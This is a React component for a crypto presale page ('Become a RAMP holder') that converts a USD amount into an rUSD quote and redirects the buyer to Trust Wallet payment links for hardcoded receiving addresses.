 import { useEffect, useState } from "react";
import Dapp from "./Dapp";
 
import { Divider } from "antd";
import Nav from "../template/Nav";
import { Link } from "react-router-dom";
//import mainJs from "../components/script/mainJs";



 
const Buy = () => {

  const [rate, setRate] = useState('');
  const [bnbPrice, setBnbprice] = useState(289);
  const [btcPrice, setBtcprice] = useState(21675.22);
  const [busdPrice, setBusdprice] = useState(1);
  const [usdtPrice, setUsdtprice] = useState(1);
  
  const [paymentmethod, setPaymentmethod] = useState('');
  const [inputAmount, setInputamount] = useState(0);
  const [highAmount, setHighAmount] = useState(0);
  const [cryptoTopay, setCryptoTopay] = useState(0);
  const [usdtTohigh, setUsdttohigh] = useState(0.057756);
  const [showButton, setShowbutton] = useState(false);
  const wallet = "0x22435B3c8fB160122D04E17C3865B4EeB896bF55";
  const bnbWallet = 'bnb1662hjmppp9gafrvp57kyzsskzzcxrlkcdlqldr';
  const bnbUri = 'https://link.trustwallet.com/send?coin=714&address=bnb1662hjmppp9gafrvp57kyzsskzzcxrlkcdlqldr';
  const btcWallet = 'bc1qtdnznpkzjsygh3fpy9u0z44ln405ppwhy773de';
  const btcUri = 'https://link.trustwallet.com/send?coin=0&address=bc1qtdnznpkzjsygh3fpy9u0z44ln405ppwhy773de';
  const usdtWallet = '0x2C61Ec7391088002e9241c779674A35830C0D860';
  const usdtUri = 'https://link.trustwallet.com/send?coin=20000714&address=0x2C61Ec7391088002e9241c779674A35830C0D860&token_id=0x55d398326f99059fF775485246999027B3197955';
  const busdWallet = '0x2C61Ec7391088002e9241c779674A35830C0D860';
  const busdUri = 'https://link.trustwallet.com/send?coin=20000714&address=0x2C61Ec7391088002e9241c779674A35830C0D860&token_id=0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
  const [errorMessage, setErrorMessage] = useState('');

  var url = "https://link.trustwallet.com/send/";
  

  async function getapiatabnb() {
      const response = await fetch("https://min-api.cryptocompare.com/data/price?fsym=BNB&tsyms=USD");
      var data = await response.json();
      if(data.USD){
        var price = data.USD;
        var price1 = price.toFixed(8);
        
        setBnbprice(price1);
      }
     
      
    }

    async function getapiatabtc() {
      const response = await fetch("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD");
      var data = await response.json();
      if(data.USD){
        var price = data.USD;
        var price2 = price.toFixed(8);
         
          setBtcprice(price2);
        }
     
    }

     
      async function getapiatahigh() {
        const response = await fetch("https://min-api.cryptocompare.com/data/price?fsym=ramp&tsyms=USD");
        var data = await response.json();

        if(data.USD){
          
            var newP = data.USD + 0.015696;
            var price = newP  * 0.86;
            var price3 = price.toFixed(4);
            setUsdttohigh(price3);

        }

       
          
    }
     

  useEffect(() => {

      if(bnbPrice == 289){
        getapiatabnb();
        getapiatabtc();
        getapiatahigh();
      } 
     

     if(inputAmount){

      var highrate = (1/usdtTohigh) * inputAmount;
      setHighAmount(highrate.toFixed(4)); 

     }

  }, [inputAmount]);


  function paymentMethodChange(payMethod){

    if(payMethod == ""){
      setShowbutton(false);
      setErrorMessage('Please select payment method');
      return false;
      
    }

    if(inputAmount < 100){
      setShowbutton(false);
      setErrorMessage('Minimum of USD100');
    }else{

      setShowbutton(true);
      setErrorMessage('');
    }
    setPaymentmethod(payMethod);
    
   
   
  }


 function updateInputAmount(amount){

 

  if(amount < 100){
    setShowbutton(false);
    setErrorMessage('Minimum exchange $100');
    return false;
  }
  setShowbutton(true);
   setInputamount(amount);
   

 } 

 function buyButton(){


  let cryptoAmount = 0;
  let cryptoAmountToPay = 0;
  let newurl = '';
  if(paymentmethod == ""){
    
    return false;
   
 
  }else if(paymentmethod == "bnb"){
       cryptoAmount = (1/bnbPrice) * inputAmount
       cryptoAmountToPay = cryptoAmount.toFixed(4);
       newurl =  bnbUri + "&amount=" + cryptoAmountToPay;

 }else if(paymentmethod == "btc"){
    
   cryptoAmount = (1/btcPrice) * inputAmount
   cryptoAmountToPay = cryptoAmount.toFixed(6);
   newurl =  btcUri + "&amount=" + cryptoAmountToPay;

 }else {
  cryptoAmount =  inputAmount
  cryptoAmountToPay = inputAmount;
    if(paymentmethod == 'busd'){
      newurl = busdUri + "&amount=" + cryptoAmountToPay;
    }else{
      newurl = usdtUri + "&amount=" + cryptoAmountToPay;
    }

 }
   

   //now set high token to receive
   var highrate = (1/usdtTohigh) * inputAmount;
   setHighAmount(highrate.toFixed(4)); 
   

 
  window.location.href = newurl;
 
 }
 
  return (
    <> 
     
              <div className="card">
                <div className="card-header">
                  <h5 className="mb-0">
                    
                       <img src="/images/favicon.png" style={{height: "20px"}}  /> Become a RAMP holder
                 
                  </h5>
                </div>
                <div
                  id="collapseOne"
                  className="collapse show"
                  aria-labelledby="headingOne"
                  data-parent="#accordionExample"
                >
                  <div className="card-body">
                  <div className="row text-center mb-2">
               
            </div>
            <div className="form-group mt-4" >
              <div id="swapInfo" className="mb-3">
                
                <h4>You Pay  </h4>


                <div className="row">

                  <div className="col-md-6">
                  <div className="coinMax">
                   <p>In (USD)</p>
                    <input
                      onChange={(e) => setInputamount(e.target.value)}
                      required=""
                      id="pay-amount"
                      type="number"
                      className="form-control"
                      placeholder="100"
                      style={{  marginBottom: 5 }}
                    />
                </div>

                  </div>
                  <div className="col-md-6">
                      <div className="coinMax">
                      <p>With</p>
                        <select className="form-control" onChange={(e) => setPaymentmethod(e.target.value)}>
                        <option value="">Select</option>
                        <option value="usdt">USDT</option>
                        <option value="busd">BUSD</option>
                        
                          <option value="bnb">BNB</option>
                          <option value="btc">BTC</option>
                          
                        </select>
                      </div>
                  </div>
                </div>
                 
                
                  
                 




                  <hr/>

                  <h4>You Get</h4>

                 <p> {highAmount} rUSD </p>
                  
                
              </div>
             
              <div className="exchangeInfo">
                <div id="price" className="mt-3">
                  <p>Exchange Rate</p>
                  <p style={{ fontWeight: "bold" }}>
                    1 rUSD =
                    <b style={{ fontSize: 15, color: "#16c784" }}>
                      <span> {usdtTohigh} </span>
                    </b>
                    USDT
                    
                  </p>
                </div>
                
                 
                <hr/>
              </div>

              {
                inputAmount > 99 && paymentmethod != '' ? <>
                  <button
                      onClick={() => buyButton()}
                      style={{
                         
                        
                        border: "none",
                        paddingLeft: 10,
                        paddingRight: 20
                      }}
                      className="bt btn"
                      type="button"
                      id="pay-button"
                  >
                Buy  <img src="/images/favicon.png" style={{height: "20px"}}  />
              </button>
                </>: <>


                {
                  errorMessage != '' ? <>

                      <div className="row">
                        <div className="container">
                          <div
                            className="alert alert-success"
                            id="status"
                            style={{ display: "block" }}
                          >
                            {errorMessage}
                          </div>
                        </div>
                      </div>
                

                  </>:<></>
                }


           
                
                </>
              }
              
            </div>




                  </div>
                </div>
              </div>

              
        {/* Footer*/}
        
      
    </>
  );
};
export default Buy;
